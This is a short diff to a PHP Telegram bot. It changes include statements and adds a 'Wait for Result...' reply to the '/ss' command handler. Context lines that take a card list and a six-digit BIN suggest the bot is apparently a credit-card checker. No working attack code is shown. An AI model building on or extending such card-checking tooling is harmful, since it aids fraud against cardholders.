@@ -11,9 +11,9 @@
 
 include __DIR__."/../config/config.php";
 include __DIR__."/../config/variables.php";
-include_once __DIR__."/../functions/bot.php";
-include_once __DIR__."/../functions/db.php";
-include_once __DIR__."/../functions/functions.php";
+include __DIR__."/../functions/bot.php";
+include __DIR__."/../functions/db.php";
+include __DIR__."/../functions/functions.php";
 
 
 ////////////====[MUTE]====////////////
@@ -28,7 +28,17 @@ if(strpos($message, "/ss ") === 0 || strpos($message, "!ss ") === 0){
         'parse_mode'=>'html',
         'reply_to_message_id'=> $message_id
       ]);
- 
+        return;
+
+    }else{
+        $messageidtoedit1 = bot('sendmessage',[
+          'chat_id'=>$chat_id,
+          'text'=>"<b>Wait for Result...</b>",
+          'parse_mode'=>'html',
+          'reply_to_message_id'=> $message_id
+
+        ]);
+        
         $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
         $lista = substr($message, 4);
         $bin = substr($cc, 0, 6);
